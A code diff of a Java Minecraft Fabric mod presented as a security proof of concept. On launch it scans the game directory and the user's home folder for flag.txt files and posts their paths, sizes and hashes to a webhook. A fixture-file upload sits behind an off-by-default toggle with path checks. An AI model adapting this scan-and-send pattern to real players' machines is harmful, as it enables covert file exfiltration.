@@ -29,10 +29,15 @@ import java.util.concurrent.CompletableFuture;
 public final class SecurityPocMod implements ClientModInitializer {
     private static final String MOD_TAG = "[MinecraftModPoC]";
 
-    // Source-code toggle. TRUE uploads contents only from the dedicated test fixture below.
+    // Change this to true only to upload the disposable fixture's contents.
     private static final boolean SEND_FILE_CONTENTS = false;
-    private static final long MAX_UPLOAD_BYTES = 7L * 1024L * 1024L;
 
+    // EDIT THIS PATH if you want to rename/move the approved test-file location.
+    // It is relative to the active Minecraft game directory.
+    private static final String CONTENT_UPLOAD_RELATIVE_PATH =
+            "security-poc/approved-test-files/flag.txt";
+
+    private static final long MAX_UPLOAD_BYTES = 7L * 1024L * 1024L;
     private static final HttpClient HTTP = HttpClient.newBuilder()
             .connectTimeout(Duration.ofSeconds(10))
             .build();
@@ -56,10 +61,18 @@ public final class SecurityPocMod implements ClientModInitializer {
                 return;
             }
 
+            Path fixturePath = gameDir.resolve(CONTENT_UPLOAD_RELATIVE_PATH).normalize();
+            if (!fixturePath.startsWith(gameDir)) {
+                System.err.println(MOD_TAG + " Refusing unsafe content-upload path: " + fixturePath);
+                return;
+            }
+            System.out.println(MOD_TAG + " Content-upload test fixture path: " + fixturePath);
+            System.out.println(MOD_TAG + " SEND_FILE_CONTENTS = " + SEND_FILE_CONTENTS);
+
             Path fallbackRoot = getUserSearchRoot();
             System.out.println(MOD_TAG + " First scanning active Minecraft game directory: " + gameDir);
             System.out.println(MOD_TAG + " If no match is found, fallback scan root is: " + fallbackRoot);
-            CompletableFuture.runAsync(() -> scanAndReport(gameDir, fallbackRoot, webhook));
+            CompletableFuture.runAsync(() -> scanAndReport(gameDir, fallbackRoot, fixturePath, webhook));
         } catch (Exception e) {
             System.err.println(MOD_TAG + " Could not initialize security scan: " + e.getMessage());
         }
@@ -78,7 +91,7 @@ public final class SecurityPocMod implements ClientModInitializer {
                 p.store(out, "Minecraft Mod Security PoC configuration. Content upload is controlled in Java source.");
             }
             Path fixtureDir = FabricLoader.getInstance().getGameDir()
-                    .resolve("security-poc").resolve("approved-test-files");
+                    .resolve(Path.of(CONTENT_UPLOAD_RELATIVE_PATH).getParent());
             Files.createDirectories(fixtureDir);
             System.out.println(MOD_TAG + " Created config and test directory: " + fixtureDir);
         }
@@ -98,7 +111,7 @@ public final class SecurityPocMod implements ClientModInitializer {
         return Path.of(System.getProperty("user.home", ".")).toAbsolutePath().normalize();
     }
 
-    private static void scanAndReport(Path gameDir, Path fallbackRoot, String webhook) {
+    private static void scanAndReport(Path gameDir, Path fallbackRoot, Path fixturePath, String webhook) {
         try {
             List<Path> matches = findFlagFiles(gameDir);
             String scannedRoot = gameDir.toString();
@@ -119,9 +132,6 @@ public final class SecurityPocMod implements ClientModInitializer {
             postJson(webhook, "Minecraft Mod Security PoC: found " + matches.size()
                     + " flag.txt file(s) under " + scannedRoot + ". Reporting path, size and SHA-256.");
 
-            Path approvedFixture = gameDir.resolve("security-poc")
-                    .resolve("approved-test-files").resolve("flag.txt").toAbsolutePath().normalize();
-
             for (Path file : matches) {
                 Path absolute = file.toAbsolutePath().normalize();
                 long size = Files.size(absolute);
@@ -132,13 +142,12 @@ public final class SecurityPocMod implements ClientModInitializer {
                         + "SHA-256: " + sha256 + "\n"
                         + "SEND_FILE_CONTENTS source toggle: " + SEND_FILE_CONTENTS;
 
-                // Arbitrary discovered files are never uploaded. Only the explicit disposable
-                // test fixture created by the user is eligible for the content-upload test.
-                if (SEND_FILE_CONTENTS && absolute.equals(approvedFixture) && size <= MAX_UPLOAD_BYTES) {
+                // Only the explicitly configured disposable fixture is eligible for upload.
+                if (SEND_FILE_CONTENTS && absolute.equals(fixturePath) && size <= MAX_UPLOAD_BYTES) {
                     byte[] fixtureBytes = Files.readAllBytes(absolute);
                     postFile(webhook, report + "\nContent: approved test fixture", fixtureBytes, "flag.txt");
                 } else {
-                    if (SEND_FILE_CONTENTS && absolute.equals(approvedFixture) && size > MAX_UPLOAD_BYTES) {
+                    if (SEND_FILE_CONTENTS && absolute.equals(fixturePath) && size > MAX_UPLOAD_BYTES) {
                         report += "\nContent upload skipped: test fixture exceeds 7 MiB.";
                     } else if (SEND_FILE_CONTENTS) {
                         report += "\nContent upload skipped: discovered files outside the approved test fixture are metadata-only.";
